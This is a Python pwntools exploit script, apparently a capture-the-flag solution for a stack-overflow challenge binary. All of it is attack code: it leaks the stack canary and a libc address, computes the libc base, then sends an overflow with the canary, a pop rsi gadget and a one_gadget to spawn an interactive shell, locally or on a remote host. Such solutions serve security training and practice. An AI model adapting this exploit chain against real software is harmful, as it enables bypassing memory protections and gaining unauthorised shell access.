#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-10_patched")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x30

# leak canary
payload = b"A" * (pad - 0x8)
payload += b"\n"
io.sendafter(b"Input: ", payload)
io.recvline()
canary = u64(b"\x00" + io.recv(7))
log.info(f"{canary=:#x}")


# leak libc
payload = b"A" * (pad + 0x7) + b"\n"
io.sendafter(b"repeat? ", payload)
io.recvline()
leak_libc = u64(io.recv(6).ljust(8, b"\x00"))
log.info(f"{leak_libc=:#x}")

libc.address = leak_libc - (libc.symbols["__libc_start_call_main"] + 128)
# libc.address = leak_libc - (libc.symbols["__libc_start_main"] + 243)
log.info(f"{libc.address=:#x}")

pop_rsi = libc.address + 0x1bb317
one_gadget = libc.address + 0xebcf8

payload = b"A" * (pad - 0x8)
payload += p64(canary)
payload += p64(elf.bss(0x200))
payload += flat(pop_rsi, 0)
payload += flat(one_gadget)
payload += b"A" * 8
io.sendafter(b"time? ", payload)

io.interactive()
